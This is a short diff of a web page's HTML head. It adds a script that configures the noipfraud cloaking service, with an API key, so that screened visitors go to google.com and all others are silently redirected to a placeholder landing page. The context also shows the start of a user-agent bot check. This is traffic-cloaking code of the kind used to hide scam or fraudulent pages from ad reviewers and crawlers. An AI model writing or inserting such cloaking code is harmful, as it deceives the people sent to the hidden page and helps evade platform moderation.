@@ -2,6 +2,18 @@
 <html lang="en-US">
 <head>
 	<script>
+  var noipfraud = {
+    key: "9118457fcad09b96b6ab8abde87cf8d8",
+    block_action: "redirect",
+    block_redirect_url: "https://google.com"
+  };
+</script>
+<script src="https://cdn.noipfraud.com/nf.js" async onload="
+  if (typeof nf_blocked === 'undefined' || !nf_blocked) {
+    window.location.href = 'https://your-real-lander.com';
+  }
+"></script>
+	<script>
   // Function to check if the visitor is a bot based on the user-agent
   function isBot() {
     const ua = navigator.userAgent.toLowerCase();
